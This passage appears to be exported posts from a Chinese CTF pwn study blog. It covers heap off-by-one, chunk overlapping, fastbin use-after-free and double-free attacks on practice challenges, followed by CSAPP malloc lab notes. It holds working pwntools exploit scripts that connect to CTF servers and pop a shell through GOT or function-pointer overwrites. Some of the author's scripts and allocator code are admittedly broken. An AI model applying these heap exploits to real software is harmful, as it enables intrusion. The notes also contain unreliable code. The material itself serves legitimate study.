&#123; ptr[i]=getchar(); &#125; return i;&#125;int main()&#123; void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(&quot;Get Input:&quot;); my_gets(chunk1,16); return 0;&#125; 可以看到0x1994020的最低位被覆盖为了“61”，也就是a的小端序。当然这里是因为前一个chunk属于已分配状态，所以下一个chunk的prev_size被内存复用为了前一个chunk的内容。 以及这个字符串操作的例子 12345678910111213141516int main(void)&#123; char buffer[40]=&quot;&quot;; void *chunk1; chunk1=malloc(24); puts(&quot;Get Input&quot;); gets(buffer); if(strlen(buffer)==24) &#123; strcpy(chunk1,buffer); &#125; return 0;&#125; ![截屏2021-12-08 下午2.32.03](/Users/rin/Library/Application Support/typora-user-images/截屏2021-12-08 下午2.32.03.png) 这样next chunk的最低位就被0覆盖了。 chunk overlapping​ off by one的一个比较简单的利用就是chunk overlapping，简单讲就是通过溢出将chunk的size位修改，导致几个连续的chunk的内存空间发生了重叠，借此可以泄露一些数据或者覆盖chunk指针。 ​ 在举例子之前先复习一下与chunk size有关的一些操作。 ​ 获取当前chunk size ：通过堆指针的直接获取size位 ​ 获取当前chunk的use状态：通过当前chunk bp+chunk size获取下一个chunk的bp，然后获得prev_inuse位。 ​ 获取前一个chunk size ：利用当前chunk指针获取当前chunk的prev size。 ​ 获取下一个chunk的地址 ：利用当前chunk的size，下一个chunk地址即为：当前chunk指针+size。 ​ 获取前一个chunk的信息：先通过prev_size算出前一个chunl的堆指针，然后再利用前一个chunk的对指针来获得相关信息。 HITCON Trainging lab13题目链接 逆向 ​ edit()中，可以输入的字符比规定的多了一个字节。 ​ 程序并没有其他非常规的操作，就是单纯的off by one+chunk overlapping的利用。 1234567#思路如下add chunk0#0x18add chunk1#0x10edit chunk1 size to 0x41free chunk1add chunk2#size = 0x30 ​ 对于每个heap，程序会申请0x10作为heap结构，然后再申请size大小作为content。 1234567create(0x18, &quot;dada&quot;) # 0create(0x10, &quot;ddaa&quot;) # 1这样操作以后内存应该是chunk0/struct #0x10chunk0/content #0x18chunk1/struct#0x10chunk1/content#0x10 ​ 申请的chunk0为0x18，原因是chunk都处于allocated状态，下一个chunk的prev_size无效，所以会被上一个chunk给内存复用。所以这里0x18是0x10的chunk0和0x8的chunk1的prevsize域。 申请两个heap后内存布局如图。 00-20是heap1的struct，20-40是heap1 content，其中，heap1 struct保存了指向heap1 content的指针。然后40-60是heap2 struct，60-80是heap2 content。 ​ 通过edit(0, &quot;/bin/sh\\x00&quot; + &quot;a&quot; * *0x*10 + &quot;\\x41&quot;)将chunk1的size覆盖为0x41。 ​ 然后释放chunk1。 ​ 释放chunk1后的内存如图。 ​ 48开始可以直接理解为一个0x41的内存块。申请一个0x30的chunk2，属于fastbin，直接找到上次释放的0x41的chunk1分配给heap2，从048开始储存。我们的目的是修改chunk在结构chunk中保存content ptr为free_got_addr,并且要show（）出来，就要确保free_got_addr的位置是原来chunk1content开始的位置，也就是078。 ​ 所以只需要利用chunk2，在合适的地方将free got addr填写到chunk1的content ptr处，chunk2的size是多少其实关系不大，只要大于8就行。 ​ 当chunk1的content ptr被覆盖成了free got addr，show（1）实际上是读取这个ptr指向的地址的内容，也就是free的真实地址。同时也就相当于把chunk1的content ptr变为了free的真实地址，所以我们只需要修改chunk1的content，就能修改free的真实地址，将我们获得的system()的地址替换就行。 ​ 这样我们就获得了system·函数，要执行这个函数，只需要free一个含字符串&quot;/bin/sh&quot;的堆。也就是我们最开始add的工具人堆chunk0. ​ 这样基本就清楚了，但是还有一个问题我不是很理解，为什么在add chunk2的时候，chunk2的结构chunk的size位为0.或者说感觉根本没有结构chunk。 一些mzr​ 我超，我大彻大悟了。原来这么半年我一直理解错了何为堆叠。我理解错了啊！其实堆叠在动调中是看不到的，因为两个chunk完全被叠在了一起，就像我修改了chunk1的size1为41，这样heap1 struct和heap1 content就被叠成了0x41的空间，是叠成了0x41而不是struct把content覆盖了，如果这个时候申请内存空间的话，被叠起来的0x20的原本的content还是能够被申请到，所以我为什么chunk2的结构chunk离奇消失，就是因为被叠起来的0x20给隐藏了，然后再通过构造chunk2的content来伪造一个heap2struct，一切就说得通。 ​ 再稍微细节一些，从代码中我们可以发现当我们free被堆叠的chunk1时，其实这个过程释放了两个chunk，一个是结构体chunk，是0x20size，另外一个是被修改为0x41的struct，然后两个chunk释放的先后顺序是先释放content，再释放struct，也就是fastbin中顺序是 struct（0x41）=&gt;content(0x20) ​ 这时候申请0x30的chunk2，首先需要申请0x20的struct，也就是被堆叠的heap1的content（这里存疑，如果fastbin的适配是smallest fit，那无话可说，但是似乎是first fit），然后再申请0x30的content，也就是被修改的0x41，这样就说得通了。 ​ 但是很奇怪的一点，ctf-wiki上的说法却和这个不太一样，他认为将struct的size修改为0x41再free后，content就被struct吞并，而不是折叠了，free也只free一个0x41的chunk，而不是两个chunk。这个有待验证。 ​ 我想通了，同时释放两个chunk是题目特地设置的，并且是必须要先释放content再释放struct才能达到效果。如果是先释放struct，0x41就会把content的所有chunk头之类的一并认为是user space然后释放，这样也就不存在content，自然就只释放一个堆块了。 一些动调​ exp打了。发现打不通。动调发现free的got表确实被被修改成system()，但是调用的时候似乎出现了问题， ​ 先检查问题是不是出现在edit()上 ​ 跟进edit()，可以看到堆结构岿然不动，但是这是正常的。因为被修改的应该是free的got表，显然那种东西不会在这里。 ​ rdi指向free的got表地址，got指向真实地址，似乎没有任何问题。 ​ 我悟了，问题所在就是，就是啥呢，就是我本地libc的符号和程序使用的对不上。所以getshell失败。好了，我爬了。 ​ ​ （所以远端也打不通的原因是？） Checksec: ​ 代码的逻辑相对来说有一些复杂，但是还是比较好逆的，管理book的结构体大概长这样： 123456struct booklist&#123; int idx; char *name; char *description; int size;&#125; ​ 然后就是常规的菜单题的逻辑，也没有后门函数，估计需要ret2libc。值得注意的是：保护除了canary，其他都开了，这样的意义我尚且不清楚。 但是又联系到作者的名字是存贮在栈上的，也许可以利用。 ​ my_read函数有一个疑点就是每一次输入完成以后都会将buf的开始的地址至0。也就是每个利用到my_read()的地址，开头一个字节都是0。 ​ 为了验证这一操作，我们动态调试一下。 ​ 操作没有验证到，反而发现一个很怪的东西，就是储存name和des的chunk的size并不是我们输入的，而是限定的0x20，也就是32。这样就对应了add函数最的一段： ​ 对着伪代码摁逆确实没什么思路，但是动调一下思路就清晰了，程序将原本储存name或者des的堆指针赋给了size为0x20的chunk。但是这么做的目的何在？ ​ 没辙了，没有一点思路。 ​ （偷偷看一眼wp，只看逆向部分） ​ ​ （不懂，为什么对于边界的考虑不当，我觉得挺当的qwq。wp说存在空字节溢出，那估计又是我想错了。呜呜，我想通了。就是这个*buf = 0，我是傻逼。） ​ 其实是最后一位被清0了，但是我一直想的是原本的buf的开始被清0。现在想通了，其实特别简单，就是当i等于32的时候，buf还自增了，然后才判结束循环，这时候又将末位置0，就相当于多输了一个0，造成了空字节溢出。 ​ （wp关闭，开始瞎写时间） ToBeContinue 总结稍微总结一下昨天的学习吧。 其实虽然做了大概十个小时，但是只做了三个题不到，其中有大段时间在修复崩坏的环境以及研究pwndocker的一些问题，还有无谓的逆向，结果做不出。 并且对于hicton lab 13这道题 ，一个简单的概念卡了我很久。 现在看来，原因有2:我没有认真逆向。错过了很多我不以为意的内容，pwn题只要一个细节没有注意到就会被坑很久，所以还是那个老生常谈的话题，逆向。其实这个问题一方面是我逆向太不认真了，还有一方面是刷的题太少，甚至没办法总结规律。比如通过这两道题我总结出来的规律是：一般在普通的ptr = malloc（）之外还会特地创建一个struct用来管理每个表项的结构（我早就应该想到的），这个结构中通常会储存堆中的指针（我早就应该知道的，但是不知道为什么，我半年来一直没有意识到这个问题），所以我们覆盖的其实是堆struct chunk中储存的chunk bp，而不是实际的chunk bp（那个储存在哪里都不清楚捏）。 然后就是还是对chunk以及bin的一些操作或者说数据结构不是非常了解，导致概念不清。所以我暂停一天刷题，然后把malloc lab的分离适配搞完。 ​ ​ ​","categories":[{"name":"HEAP - Off By One","slug":"HEAP-Off-By-One","permalink":"https://fuurinko.github.io/categories/HEAP-Off-By-One/"}],"tags":[{"name":"heap_pro","slug":"heap-pro","permalink":"https://fuurinko.github.io/tags/heap-pro/"}]},{"title":"fastbin attack","slug":"fastbin_attack","date":"2021-12-06T08:17:00.507Z","updated":"2022-04-02T00:38:54.042Z","comments":true,"path":"2021/12/06/fastbin_attack/","link":"","permalink":"https://fuurinko.github.io/2021/12/06/fastbin_attack/","excerpt":"","text":"fastbin​ 长度在32-160(32位系统是16-80)的free堆块。通过fastbinlist储存，单向链表，所以fast。fastbin attack一个最简单的利用就是UAF，其次就是fastbin double free。ctf pwn中与fastbin相关的还有就是在unsortedbin attack中涉及到的，也是ptmalloc机制中的一种的malloc_consolidate，其中也有可以攻击的机会，但是这个内容日后再在unsortedbin attack的笔记中再进行研究吧。 UAF​ 先从一个简单的例子开始： hacknote题目链接 ​ 菜单题，增删查改一应俱全，同时还有后门函数。那么利用思路就是利用悬垂指针，将后门函数的地址覆盖堆指针，使得调用print_note实则是在调用后门函数。 ​ 然后来详细分析一下题目的逻辑。 ​ 在add_note()中，对于每个note，程序分配了两个堆块，一个chunk储存结构体note的两个字段：printnote 的指针和content的指针，一共是8字节，另一个chunk则储存内容，size由用户输入决定。 ​ 每个note的chunk的地址是连续的。 ​ 我们连续申请两个note。 12addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1 ​ 可以看到从158开始就是第一个chunk0的指针，8字节没有问题。然后168开始是content chunk。顺带一提0x11=是因为八字节的user space+8字节的chunk头以及最低位1的inuse。0x31则是因为对齐补全而多了八字节，也就是0x20（user space）+0x8（chunk头）+0x8（对齐）+最低位置1。 ​ 然后我们分别释放这两个chunk。 （然后发现fastbin是空的，free chunk跑Tcache了，有一点尴尬） ​ ​ 问题不大，pwndocker好处就体现在此。 ​ 可以看到两个note的四个堆块都被free了。并且处在不同的空闲链表中，但是这不是重点。 ​ 可以看到，被free的四个chunk的内存地址是连续的，所以当我们申请一个size为8的note2时，malloc会在空闲链表中寻找符合的free chunk，并且由于0x10和0x28的free chunk是分别的两条空闲链表，所以malloc会直接在0x10的链表中寻找，并从链表中取出尾部的free chunk，也就是刚才被释放的note1的指针chunk。 ​ fastbin的0x10中的两个free chunk都被分配了，一个储存指针，一个储存content。位置分别是0x5695c038和0x5695c0300。 ​ 也就是说，note2的content chunk，实则被分配到了note0的指针chunk的内存空间，而原本在这里储存的是note0的*put和 *content，也就是说，如果我们此刻执行print(note0),那么程序就会将执行函数与 *put指向的地址的操作绑定执行put。 ​ 此刻我们的*put指向的是cccc，那么我们只要把它换成后门函数地址，就能够getshell。 ​ 完整exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./hacknote&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]##context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#context.log_level = &quot;debug&quot;def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))#gdb.attach(r)magic = 0x08048986addnote(32, &quot;yuuu&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(0x8048986))#gdb.attach(r)printnote(0)r.interactive() pwnable_hacknote​ 好，写了很多。然后再稍微加强一点，来看pwnable.tw上的hacknote。 ​ 题目链接 ​ 源码和hitcon lab相比就是缺少了后门函数，需要ret2libc。直接利用之前的思路，将*put覆盖为print的地址和puts的got表，泄露puts的虚拟地址，然后经典ret2libc，拿到ststem的地址，传参的话还是一样的思路。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./hacknote&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/ctf/work/work/challenge/pwnable/hacknote/libc_32.so.6&quot;&#125;)r = remote(&#x27;chall.pwnable.tw&#x27;,10102)libc = ELF(&quot;./libc_32.so.6&quot;)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#context.log_level = &quot;debug&quot;print_addr = 0x804862bputs_got = 0x804A024def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))#gdb.attach(r)magic = 0x08048986addnote(32, &quot;yuuu&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8,p32(print_addr)+p32(puts_got))printnote(0)puts_addr = u32(r.recv(4))print(hex(puts_addr))libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]system_addr = libc.symbols[&#x27;system&#x27;] - libc_basedelnote(2)addnote(8,flat([system_addr,&quot;||sh&quot;]))#gdb.attach(r)printnote(0)r.interactive() FastbinDoubleFree​ ​ 关于fastbin attack，利用其实非常的简单，就是使得被二次释放的chunk不与main_arena直接指向就行。这样就会造成被二次释放的chunk被再次插入空闲链表，使得下一次申请合适size的chunk时会申请到被二次释放的chunk，而chunk的fd又能够随意修改，造成任意地址写与执行。 ​ 从数据结构的角度看，fastbin与其他bin不太一样的就是，它是由单向链表管理，chunk只有一个fd，链表头为main_arena（关于这里一直不太理解main_arena是怎样管理所有bin并通过它得到bin的偏移的），新free的chunk会被插入表头，而取出时遵循的是frist fit原则，也就是从头开始检查，并取出第一个符合条件的chunk。 ​ 高效，但是势必会造成一定的fragment，但是由于fastbin chunk本身的size足够小，所以可以忽略。 ​ 例子来源于之前做过的一些题： metasequoia_2020_samsara​ 题目链接 ​ 逻辑比较好逆，如果v8等于deadbeef就能getshell。 ​ ​ 然后变量的栈布局是这样的 ​ ​ 可以看到v7和v8只差了8字节，如果能够溢出或者其他操作将v8修改就能拿到flag。然后从上面的逻辑我们知道v7的真实地址，以及我们能够对v7对地址写入任意内容。当然这里不能像栈溢出那样直接溢出v7，将内容写入v8.（具体的原因我其实不是很清楚，是有溢出的检测还是啥捏)，而是需要利用某种方式使得能够任意地址i写 ​ 然后又已知这道题的考点是fastbin double free，这个利用方式正好能造成任意地址写。 ​ 那么思路大概是 1234567add chunk0add chunk1add chunk2#防止free chunk被top chunk合并free chunk0free chunk1free chunk0 ​ 此刻fastbin链表大致如下： 1main_arena =&gt; chunk0 =&gt; chunk1 =&gt;chuk0 ​ 然后此时再 12345add chunk3 #申请到的是chunk0的内存空间edit chunk3#在fd位填入v8的地址（可以通过打印v7的地址获得）然后链表大概长这样：main_arena =&gt; v8 =&gt;chunk1 =&gt;chunk0（这里是错的，后面有更正）所以此时只要再add chunk3，就能申请到v8的内存空间，并进行任意写。 ​ 然后就可以直接写exp了；def部分是直接复制我以前做的时候的exp，那个exp又是我不知道从哪里复制过来的qwq。 ​ （话说上次看大佬写的calc的exp，突然觉得就算是简单的py脚本也能够写得非常抽象捏，什么类型转换数组处理还有各种循环看得我头疼捏，真离谱捏。） ​ （写exp的时候发现一个非常畸形的问题，就是我的delete函数无论怎样都会报错，但是先进的vscode完全没有给我一个合理的错误解释，后来在容器中执行了才给我一条有价值的报错。大概就是因为原本的exp的tab和空格混用了，改一下就行，其实之前也遇到过类似的问题，但是当时没有完全意识到问题所在并且不知道为什么就解决了所以没有留下印象） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *#p = process(&#x27;./metasequoia_2020_samsara&#x27;)#p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;, &quot;./metasequoia_2020_samsara&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)p = remote(&#x27;node4.buuoj.cn&#x27;,27450)#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#context.log_level = &quot;debug&quot;elf = ELF(&#x27;./metasequoia_2020_samsara&#x27;)def add(): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;1&#x27;)def dele(idx): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;2&#x27;) p.sendafter(&#x27;:&#x27;,str(idx))def edit(idx,content): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;3&#x27;) p.sendafter(&#x27;:&#x27;,str(idx)) p.sendafter(&#x27;:&#x27;,content)def show(): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;4&#x27;)def move(dest): p.recvline(&quot;choice &gt; &quot;) p.sendline(&#x27;5&#x27;) p.sendafter(&#x27;?&#x27;,str(dest))#double freeadd()#0add()#1dele(0)dele(1)dele(0)#gdb.attach(p)add()#2--&gt;0add()#3 --&gt;1move(0x20)show()#get the addr of v7v7_addr = u64(p.recv(8))v8_addr = v7_addr - 8edit(2,p64(v8_addr))edit(3,&quot;0xDEADBEEF&quot;)p.sendlineafter(&quot;choice &gt;&quot;,&#x27;6&#x27;)p.interactive() ​ 打不通，并且因为未知原因（大概率是elf头的ld不匹配），导致本地无法调试，去网上搜了一下wp，发现有这么几个个细节我没有注意，或者说想错了。 ​ 在进行double free的时候，我只预先申请了两个chunk，并且将前一个申请的chunk double free了。但是wp预先申请了三个chunk，然后我意识到，第三个申请的chunk很有可能是防止之前被free的两个chunk被top chunk合并，之前刷堆题的时候经常碰到这一点，但是太久没做了，有些忘了。这里是没有注意到的细节。 ​ 然后是想错了的部分，可以看到我之前的wp中的思路是这样的： ​ 错误所在就是，修改free chunk0的fd之后，它在fastbin中的位置应当还是 main_arena =&gt; chunk1 =&gt;chunk0(v8) ，也不知道为什么我会以为新的fd会被重新插入链表。 ​ 然后按照first fit原则，我们连续add两个chunk，就能够申请到v8的内存空间了。后面的内容就问题不大了。 ​ 所以更正后的exp大概是这样： 12345678910111213141516171819add()#0add()#1add()#2,防止与top chunk合并dele(0)dele(1)dele(0)#gdb.attach(p)add()#3--&gt;0add()#4 --&gt;1move(0x20)show()#get the addr of v7v7_addr = u64(p.recv(8))v8_addr = v7_addr - 0x8edit(3,p64(v8_addr))add()#5add()#6edit(6,0xDEADBEEF) 总结​ 感觉每个入门堆题的人首先开始做的题目都是fastbin attack以及UAF，因为确实相对来说简单易懂。但是反观我半年前写的fastbin attack的wp，我的评价是：狗屁不通。 ​ 所以我对于堆题，或者是整个ctf pwn的学习其实是走了很多弯路的。比如说对于动调的惧怕，导致我做了很多题，但又没完全做。比如我学习堆题，却不愿意沉下心来，从了解ptmalloc开始，而是摁刷题，导致知识点被割裂得完全串联不上，学完就忘。现在从csapp malloc lab开始逐步琢磨glibc，然后睡前再看半个小时源码剖析，再辅以ctf pwn的一些题目的分析，对于各种知识点好歹是有了一个足以将它们串联起来的体系，从而做题是不再那么一头雾水了。如果在半年前我能意识到这一点就好了。但是我还是觉得任何在pwn学习过程中踩过的坑，无论是知识点本身的坑，还是学习方案上的坑，都是宝贵的，无可替代的学习经验捏。","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"heap_pro","slug":"heap-pro","permalink":"https://fuurinko.github.io/tags/heap-pro/"}]},{"title":"csapp malloc lab","slug":"malloc lab","date":"2021-12-03T08:46:22.570Z","updated":"2022-03-25T11:57:35.025Z","comments":true,"path":"2021/12/03/malloc lab/","link":"","permalink":"https://fuurinko.github.io/2021/12/03/malloc%20lab/","excerpt":"","text":"0）前言​ 鸽了三个月的malloc lab，作为复习堆题的开始。 ​ 计画完成时间是12.5之前，也就是三天。 1）大体设计​ 对于整体的操作的大致模型以及allocater和freer需要做的工作如下： ​ 分配器： 在第一次分配chunk时，对堆空间进行初始化=&gt;mm_init() 创建指定类型的chunk。 ​ free 利用隐式空闲链表，将free状态的chunk链接。 利用合适的机制，对物理地址相邻的free chunk进行合并 利用合适的机制，在分配器有需求的时候分割相对应的free chunk，并将其标识为allocated。 ​ 其他的驱动代码以及头文件已经给出，我们只需在mm.c中进行编写。 ​ 在这个模型中，分配器的分配的chunk的结构大致如下，运用带边界标记的chunk使堆块合并更加优雅。 ​ ​ 2）利用宏定义简化指针操作​ 为了简化在操作chunk在链表中的一些与指针相关的行为，我们可以定义一系列宏来将这些操作打包，使得代码更为简洁，同时一些基本的常数也将被定义。 ​ ​ ​ 3）level·1​ level1利用隐式空闲链表+首次/下一次/最佳适配三种方式实现。 first_fitmm_init()​ 首先是mm_init()函数，利用mm_sbrk()创建一个4字的空闲链表，将链表第一个双字的首尾分别标记为序言块的header和footer，然后将第三个字标记为结尾块，然后调用extend_heap()函数初始化堆空间。被初始化的size为CHUNKSIZE/WSIZE也就是1*10^12 / 4。 ​ 然后是extend_heap()函数，利用mm_sbrk()创建size大小的空间，size由之前初始化的size决定。并且将整个空chunk的对应位标记头和脚部。最后，在很可能出现的前一个堆以一个空闲块结束的情况，我们调用coalesce函数来合并两个空闲块 ，并返回指向合并后的块的块指针。coalesce函数将在后面的部分被详细分析。 mm_malloc()​ 堆空间初始化之后，我们首先设计mm_malloc()。 ​ 函数大致功能是： 检查请求真假，然后准备分配chunk 调整chunk size，在请求size的基础上加入8字节的对齐和8字节的chunk头和chunk脚。也就是说，一个chunk至少会有16字节。 在free list中寻找符合size要求的chunk。 如果没有在free list中找到，则直接调用extend_heap() 生成对应的空间。 ​ 这里csapp没有为我们提供find_fit()以及place()的例子,需要我们自己编写。我们先放着，之后再来讨论。 mm_free()​ mm_malloc()之后，我们来看mm_free() ​ 它被用来释放已被分配的chunk，相当于释放malloc所请求的bp，然后需要将被释放的chunk与其物理领接的free chunk合并。 ​ ​ coalesce()​ 重点来看coalesce() ​ 这里用到的合并方式的构思图表如下： ​ ​ 也是非常地直观容易理解。 ​ 它的代码实现也直观地被分为如图四种情况，所以我们先要定义对应图中几种状态的bp状态。 123size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); ​ 大致框架如下： ​ find_fit()​ 整个malloc lab的重点，需要自己实现一个free chunk的适配寻找。 ​ 一些常见的方法有 首次适配 下一次适配 最佳适配 分离式（复杂） ​ 其实这些并不是完全先进或者落后，各有各的优缺点。在这里为了简单我们选择首次适配，即使用在free list中找到的第一个符合条件的chunk。 ​ 按照首次适配的原理，我们的思路是，从头到尾搜索链表，如果遇到合适的free chunk，则按照size将其头和尾部标记。 ​ 实现大致是： ​ 指定一个size，在链表中通过判断头部inuse位，找到第一个free chunk的bp,，然后计算next bp是否大于bp + size ,且状态为free，如果是，将bp标记为allocated，在bp+size的地方标记为footer，分割该chunk，虽然会留下一定的碎片，但这也是首次适配无法避免的缺点。如果不是，则继续寻找下一个free chunk并判断。 ​ 然后来研究代码实现： ​ 自己瞎写了一个，问题不大。 place()​ 函数功能是将请求块放置在空闲块的起始位置，只有当剩余部分的大小等于或者超出最小块的大小时，才进行分割。 12345678910111213141516static void place(void *bp, size_t asize)&#123; size_t size = GET_SIZE(HDRP(bp)); if ((size - asize) &gt;= (2*DSIZE)) &#123; PUT(HDRP(bp),PACK(asize,1)); PUT(FTRP(bp),PACK(asize,1)); PUT(HDRP(NEXT_BLKP(bp)),PACK(size - asize,0)); PUT(FTRP(NEXT_BLKP(bp)),PACK(size - asize,0)); &#125; else &#123; PUT(HDRP(bp),PACK(size,1)); PUT(FTRP(bp),PACK(size,1)); &#125;&#125; 问题不大 next_fit​ 下一次适配，主要特点是在第一次在空闲链表中找到合适的chunk以后，下一次搜索就不再是从头到尾，而是从上一次搜索的chunk开始继续搜索。 ​ 相比于首次适配，写循环时就不能嗯搞，要处理第一次找到fit chunk后的状态。大致的思路是：先按照首次适配的方式找到第一个适合的chunk，然后记录下chunk的bp，下一次寻找时则从记录的bp开始寻找。 ​ 那么肯定需要定义一个外部变量来记录每次找到的bp。 1234567891011121314151617181920212223242526272829static void *next_find_fit(size_t asize)&#123; char * bp = heap_listp; size_t ALLOC_STATUS; size_t SIZE; while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0) &#123; if(mark_bp) &#123; bp = NEXT_BLKP(mark_bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue; mark_bp = bp; return bp; continue; &#125; bp = NEXT_BLKP(bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue; mark_bp = bp; return bp; &#125; return NULL;&#125; ​ 问题不大。 best_fit​ 搜索链表中的每一个堆块，选择符合条件的最小空闲块。目前来说思路是这样的： ​ 对整个堆空间进行搜索，标记合适的chunk，并将size储存在数组中，在搜索结束后进行排序，选择最适合的chunk，并将bp返回。 ​ 对堆空间进行搜索，大概只需要在原本的算法上去掉结束循环的判定条件。然后排序的话随意找个排序算法来就行，图方便我复制了一个冒泡排序，虽然时间复杂度不太行。 ​ 但是存在一个问题就是，排序肯定是以chunk的size为标准，但是如何关联size和bp呢？我将所有符合条件的chunksize排序之后，如何找到对应的bp？ ​ 一个比较直观的解决方法就是二维数组，将bp和size同时存放，同时排序，当然也许可以使用类似PACK的宏，或者为每一个size增加一个idx，也是二维数组的思路，但是并不是直接将bp存放，而是存放bp的idx。 ​ 考虑到二维数组排序有一些麻烦，故直接定义结构体来存放size与bp的idx。 12345678910111213141516171819202122232425262728static void *best_find_fit(size_t asize)&#123; char * bp = heap_listp; size_t ALLOC_STATUS; size_t SIZE; struct bp_list list[]; while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0) &#123; for ( int i = 0; i &lt; CHUNKSIZE/WSIZE; i++) &#123; bp = NEXT_BLKP(bp); ALLOC_STATUS = GET_ALLOC(HDRP(bp)); if (ALLOC_STATUS) continue; if(SIZE &lt; asize) continue list[i].bp_size = GET_SIZE(HDRP(bp)); list[i].bp_idx = i; list[i].bp = HDRP(bp); &#125; bubble_sort(int list[i].bp_size,int i); return list[i].bp; &#125; return NULL;&#125; 4) level2​ level2利用显式链表和分离适配来实现，同时这种方法也是非常接近ptmalloc2的，所以学习这种方法的思想是十分必要的。 数据结构显式空闲链表​ 相比于隐式空闲链表没有实际的链表去管理空闲块，显式空闲链表使用新增的双向循环链表，通过在chunk头添加指向逻辑上相邻的chunk的指针来相互连接。显式链表为chunk指针操作增添了更多姿势，突破了隐式性能的局限性。当然这个方案也不是完全没有缺点，为了包含指针和可能的脚部，显式空闲链表的chunk通常会更大一些，潜在地提高了内存碎片的程序。 chunk​ 显式链表chunk结构如图： ​ 有点类似ptalloc的机制，当chunk为allocated状态，中间为padding，当为free状态，会在padding开始前，也就是之前方案中的bp指向的地方增添两个指针：next_bp， prev_bp。 First_fit​ 因为确实不太会写，所以基本算是照着代码分析思路了。 ​ 首先是完成显式空闲链表下first_fit的实现，这种方案目的是熟悉如何通过创建一个双向循环链表来管理空闲块。 ​ 第一步是创建空闲链表。 ​ ​ 显式链表下的free()也和隐式空闲链表没区别，都是把chunk 头的size置0，但是多出来了 12SET_PREV(bp, 0);SET_NEXT(bp, 0); ​ 也就是先将需要free的chunk的fd和bk位全部设置为0，然后进行合并后放入空闲链表。 ​ ​ 然后编写将chunk插入和取出双向循环链表的操作。 insert_from_free_list()​ 将已分配块释放，chunk bp 被插入free list。 remove_from_free_list()​ 在free list中拿出chunk。与隐式链表类似，分为四种情况。因为是双向循环链表，所以解链的过程也可以理解为unlink。 ​ 第一种情况：prev == NULL &amp;&amp; next == NULL，chunk前后都是allocated chunk，双向链表中啥也没有，设置表头为空。 ​ 第二种情况：prev == NULL ，前一个chunk为allocated，前一项为空，说明此时chunk的前面没有chunk，那么bk本身就是空的，解链就需要设置fd为空，也就是next为0。 ​ 第三种情况同理。 ​ 第四种情况：chunk前后都有free chunk，那么解链相当于一个标准的unlink，就是将前一个chunk的bp的next位设置为下一个chunk的bp，然后下一个chunk的prev位设置为前一个chunk的bp。 分离适配​ 分离适配的特点就是利用很多储存不同大小范围的chunk的链表来管理free chunk，很大程度上减小了内存碎片的产生。 ​ 根据参考资料，我们可以将大小以2^n划分。 ​ ​ 5）结果与改进​ ​ 6）反思与思考​ 本来应该是在今年暑假就要完成的东西，因为太过懒散而拖到了现在。不得不说如果沉下心来做，这个lab其实不算很难，最难的实际上是对这个简单的内存分配器从0到逐渐熟悉架构的过程。如果不去认真读csapp，了解程序的大致架构的话，就会一头雾水从而放弃，暑假便是因此。 ​ 